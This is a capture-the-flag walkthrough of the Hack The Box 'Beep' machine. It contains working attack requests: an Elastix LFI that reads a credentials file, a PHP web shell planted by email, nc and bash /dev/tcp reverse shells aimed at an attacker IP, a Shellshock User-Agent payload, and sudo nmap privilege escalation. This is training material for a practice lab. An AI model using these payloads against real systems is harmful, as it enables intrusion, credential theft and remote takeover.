# Beep
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

#### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | (Local) | Nmap Scan & Website Enumeration | Identified multiple open ports including 22 (SSH), 80/443 (HTTP/S), 10000 (Webmin), and services like Elastix and FreePBX. The version numbers suggested old software. |
| 2 | (Web) | Local File Inclusion (LFI) & Credential Leakage | Exploited a LFI vulnerability in `/vtigercrm/graph.php` to read the `amportal.conf` file, which contained cleartext passwords. This password was reused to log in via SSH as the `root` user. |
| 3 | (Web) | LFI & SMTP for RCE | (Alternative Path) Used LFI to determine the web server user was `asterisk`. Sent an email containing a PHP web shell payload to `asterisk@localhost` via port 25. Then used the LFI to execute the web shell and get a reverse shell as `asterisk`. |
| 4 | (Web) | FreePBX/Elastix Exploit | (Alternative Path) Used `sipvicious` to enumerate SIP extensions, finding extension `233`. Used the `18650.py` exploit with this extension to gain a shell. |
| 5 | (Web) | Shellshock Vulnerability | (Alternative Path) Discovered that the Webmin service on port 10000 was vulnerable to Shellshock. Exploited the vulnerability by injecting a reverse shell payload into the User-Agent header, which directly granted a root shell. |
| 6 | asterisk -> root | `sudo` Abuse with `nmap` | After gaining a shell as the `asterisk` user, ran `sudo -l` to find that the user could run `nmap` as root without a password. Used `nmap --interactive` to get an interactive shell and then executed `!sh` to get a root shell. |

## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Nmap scan report for 10.10.10.7
Host is up (0.037s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey:
|   1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA)
|_  2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA)
25/tcp    open  smtp       Postfix smtpd
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp    open  http       Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: RESP-CODES USER EXPIRE(NEVER) STLS LOGIN-DELAY(0) AUTH-RESP-CODE PIPELINING IMPLEMENTATION(Cyrus POP3 server v2) APOP TOP UIDL
111/tcp   open  rpcbind    2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            875/udp   status
|_  100024  1            878/tcp   status
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CHILDREN MAILBOX-REFERRALS NAMESPACE UIDPLUS Completed CONDSTORE ANNOTATEMORE OK UNSELECT NO URLAUTHA0001 THREAD=REFERENCES ID LIST-SUBSCRIBED RIGHTS=kxte IMAP4rev1 RENAME CATENATE X-NETSCAPE MULTIAPPEND IMAP4 LITERAL+ THREAD=ORDEREDSUBJECT LISTEXT SORT=MODSEQ BINARY SORT ACL STARTTLS IDLE ATOMIC QUOTA
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2021-10-28T22:04:01+00:00; -1s from scanner time.
878/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: -1s
```
Poking around on port 443 we can see an elastix service on the webroot and a freePBX service running under /admin route.  
under /help and scroll to backup we can see some screenshots dated 2010. so we know that elastix version is quite old.  
According to http://freshmeat.sourceforge.net/projects/elastix we can see that the release version should be 2.0/2.2.  
So we can searchsploit for elastix.  
```
[root@kali Beep ]$ searchsploit elastix                
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                    | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                 | php/webapps/37637.pl
Elastix < 2.5 - PHP Code Injection                                               | php/webapps/38091.php
Elastix 2.x - Blind SQL Injection                                                | php/webapps/36305.txt
Elastix - Multiple Cross-Site Scripting Vulnerabilities                          | php/webapps/38544.txt
Elastix - 'page' Cross-Site Scripting                                            | php/webapps/38078.py
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                           | php/webapps/18650.py
--------------------------------------------------------------------------------- ---------------------------------
```
The below two are good candidates, so let's test them.  
```
[root@kali Beep ]$ searchsploit elastix                
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                 | php/webapps/37637.pl
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                           | php/webapps/18650.py
--------------------------------------------------------------------------------- ---------------------------------
```

## User
### Method 1 - php/webapps/37637.pl and Password Reuse
Using 37637.pl, we can simply open burp and perform the following request:
```
GET /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action HTTP/1.1
Host: 10.10.10.7
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```
as a response we can see that we can access a local system file, exploiting a LFI, in fact as a response, we do get: (TL;DR most of the commented line has been removed)
```
HTTP/1.1 200 OK
Date: Mon, 01 Nov 2021 19:23:56 GMT
Server: Apache/2.2.3 (CentOS)
X-Powered-By: PHP/5.1.6
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 13779

AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE

AMPBIN=/var/lib/asterisk/bin
AMPSBIN=/usr/local/sbin

AMPWEBROOT=/var/www/html
AMPCGIBIN=/var/www/cgi-bin

FOPWEBROOT=/var/www/html/panel
#FOPPASSWORD=passw0rd
FOPPASSWORD=jEhdIekWmdjE

ARI_ADMIN_USERNAME=admin

ARI_ADMIN_PASSWORD=jEhdIekWmdjE

AUTHTYPE=database

AMPADMINLOGO=logo.png

AMPEXTENSIONS=extensions

ENABLECW=no
ZAP2DAHDICOMPAT=true

MOHDIR=mohmp3

AMPMODULEXML=http://mirror.freepbx.org/
AMPMODULESVN=http://mirror.freepbx.org/modules/
AMPDBNAME=asterisk

ASTETCDIR=/etc/asterisk
ASTMODDIR=/usr/lib/asterisk/modules
ASTVARLIBDIR=/var/lib/asterisk
ASTAGIDIR=/var/lib/asterisk/agi-bin
ASTSPOOLDIR=/var/spool/asterisk
ASTRUNDIR=/var/run/asterisk
ASTLOGDIR=/var/log/asteriskSorry! Attempt to access restricted file.
```
Here, we can see repeatedly more than once the password ```jEhdIekWmdjE```, we can test if this box is affected from a password reuse vulnerability.  
We can try to ssh as root into the box using the the discovered password, and as we can se we do get a prompt  

### Method 2 - php/webapps/37637.pl getting RCE from LFI using SMTP
Always by using 37637.pl, we can get an RCE from a LFI.  
From the initial nmap scan, we can see that port 25 (smtp) is opened.  
We know that using smtp we can send email connecting to port 25, when we send emails, a file is written under /var/mail/%RCPT_USER%.  
Now we need to check what is the user that is executing the webserver, so that then, we can send an email with a payload to that user, read the email using LFI and get a shell.  
To check what is the webserver user we can use the LFI vulnerability and request ```/proc/self/status```, and we'll get the following:
```
Name:	httpd
State:	R (running)
SleepAVG:	89%
Tgid:	3589
Pid:	3589
PPid:	3488
TracerPid:	0
Uid:	100	100	100	100
Gid:	101	101	101	101
FDSize:	32
Groups:	101
VmPeak:	   35900 kB
VmSize:	   35888 kB
VmLck:	       0 kB
VmHWM:	   16428 kB
VmRSS:	   16428 kB
VmData:	   12336 kB
VmStk:	      88 kB
VmExe:	     300 kB
VmLib:	   20928 kB
VmPTE:	      72 kB
StaBrk:	0919c000 kB
Brk:	09bcc000 kB
StaStk:	bfbb2b20 kB
ExecLim:	08497000
Threads:	1
SigQ:	0/16384
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	000000018c00466b
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
Cpus_allowed:	00000001
Mems_allowed:	1
```
As we can see we do get Uid 100 and Pid 101, checking with ```/etc/passwd``` we can see that this Uid is related to the user asterisk.  
now we can send an email to asterisk@localhost connecting to port 25:
```
Trying 10.10.10.7...
Connected to 10.10.10.7.
Escape character is '^]'.
HELO b0d.beep220 beep.localdomain ESMTP Postfix
.htb
250 beep.localdomain
VRFY asterisk@localhost
252 2.0.0 asterisk@localhost
MAIL FROM:<b0d@haha.com>
250 2.1.0 Ok
RCPT TO:<asterisk@localhost>
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Subject: you got pwned
<?php system($_REQUEST['cmd']);?>
.
250 2.0.0 Ok: queued as 862C3D92FD
QUIT
221 2.0.0 Bye
Connection closed by foreign host.
```
Now that we have our payload uploaded, we can perform the following request and get a shell:
```
POST /vtigercrm/graph.php HTTP/1.1
Host: 10.10.10.7
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 175

current_language=../../../../../../../..//var/mail/asterisk%00&module=Accounts&action=&cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.18+4444+>/tmp/f
```

### Method 3 - php/webapps/18650.py
As discovered in the initial enumeration phase we have another exploit (18650.py) that is elegible for a successul exploitation.  
In the variable section we can notice that we are required to set an "extension" variable.  
```
rhost="10.10.10.7"
lhost="10.10.14.18"
lport=443
extension="1000"
```
Running this exploit with extension value of 1000 does not work, so we need to enumerate SIP extensions using SIPVicious.  
SIPVicious suite is a set of tools that can be used to audit SIP based VoIP systems. This suite has five tools:  
svmap, svwar, svcrack, svreport, svcrash.  
We can try to run svmap to enumerate SIP service:
```
[root@kali exploits ]$ svmap 10.10.10.7                    
+-----------------+---------------------+-------------+
| SIP Device      | User Agent          | Fingerprint |
+=================+=====================+=============+
| 10.10.10.7:5060 | FPBX-2.8.1(1.8.7.0) | disabled    |
+-----------------+---------------------+-------------+
```
using svwar we can enaumerate plugins. Let's use chunks of 50 plugins to reduce the workload
```
[root@kali exploits ]$ svwar -mINVITE -e200-250 10.10.10.7
WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night
+-----------+----------------+
| Extension | Authentication |
+===========+================+
| 233       | reqauth        |
+-----------+----------------+
```
We can see the valid extension 233. So now we can use this extension id inside our exploit.
```
rhost="10.10.10.7"
lhost="10.10.14.18"
lport=443
extension="233"
```
Now, we can setup a netcat listener on port 443 and get a reverse shell.

### Method 4 - Shellshock
as we can see from the initial nmap scan, a service called webmin is running on port 10000.  
Because webmin is using lots of .cgi files we can try to shellshock this service and see if we can get a shell.  
With burp, we can try to intercept the login page and change the user-agent as follow:  
```
GET / HTTP/1.1
Host: 10.10.10.7:10000
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4; ARI=7fb5h6ukggramuhober09osbe4; testing=1
User-Agent: () { :; };/bin/echo hello
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.7:10000/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```
In the response we are not seeing any hello, so we can try blind method to check if webmin is vulnerable to shellshock.  
If we perform a request we can se that the response comes in about 100 ms (more or less).  
So, now we can try to perform the following request:
```
GET / HTTP/1.1
Host: 10.10.10.7:10000
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4; ARI=7fb5h6ukggramuhober09osbe4; testing=1
User-Agent: () { :; };sleep 10
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.7:10000/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```
Using a sleep 10 we can see that the response come out in ~10000 ms.  
With this blind method we checked that code can be executed on server side.  
Now we can perform the following request and get code execution.
```
GET / HTTP/1.1
Host: 10.10.10.7:10000
Cookie: elastixSession=3oqenhc7bvtjcid4iuqpag7341; PHPSESSID=3bb02vcbjco3ntj9odbumor1o4; ARI=7fb5h6ukggramuhober09osbe4; testing=1
User-Agent: () { :; };bash -i >& /dev/tcp/10.10.14.18/4444 0>&1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.7:10000/
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Cache-Control: max-age=0
Te: trailers
Connection: close
```
and we can get a shell as root!
```
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.7] 45241
bash: no job control in this shell
[root@beep webmin]#
```

## Root
When we log in as user asterisk we can perform a simple ```sudo -l``` and check our capabilities against binaries:
```
User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
```
Also according to [GTFOBins](https://gtfobins.github.io/) we can privesc with the following: nmap, yum, chmod, chown, service.  
Let's use nmap as suggested by 18650.py, now we can do the following:
```
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive
Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
